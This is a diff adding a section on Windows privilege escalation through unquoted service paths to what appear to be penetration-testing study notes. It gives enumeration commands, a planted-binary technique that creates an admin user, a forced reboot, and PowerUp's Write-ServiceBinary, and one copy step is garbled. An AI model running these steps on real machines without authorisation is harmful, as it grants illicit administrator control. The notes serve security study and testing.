@@ -45,7 +45,7 @@ check work
 Get-LocalGroupMember administrators
 ```
 
-## PowerUp (old)
+Using powerup
 
 import
 ```powershell
@@ -105,4 +105,60 @@ Check results
 ```powershell
 net user
 net localgroup administrators
+```
+
+
+## Unquoted service paths
+
+__REQUIRES__
+
+ - Service with unquoted path and spaces
+ - Write permissions over directory with space-breaks
+ - Either SeShutdownPrivilege or permissions to restart the service
+
+Enumerate services with PathName
+```powershell
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+```
+
+This will find the unquoted service paths, but MUST be run in cmd (not pwsh)
+```powershell
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+Identify
+```text
+C:\Program Files\My Program\My service\service.exe
+not
+"C:\Program Files\My Program\My service\service.exe"
+```
+
+Determine directory access with space break
+```powershell
+icacls "C:\Program Files\Enterprise Apps\"
+```
+
+use adduser.exe
+```powershell
+if "C:\Program Files\Enterprise Apps\"
+copy .\Enterprise.exe 'C:\Program Files\Enterprise.exe'
+Start-Service $service
+
+or
+
+shutdown /r /t 0
+```
+
+check work
+```powershell
+net user
+net localgroup administrators
+```
+
+Using powerup
+```powershell
+. .\PowerUp.ps1
+Get-UnquotedService
+Write-ServiceBinary -Name $service -Path $path
+Restart-Service $service
 ```
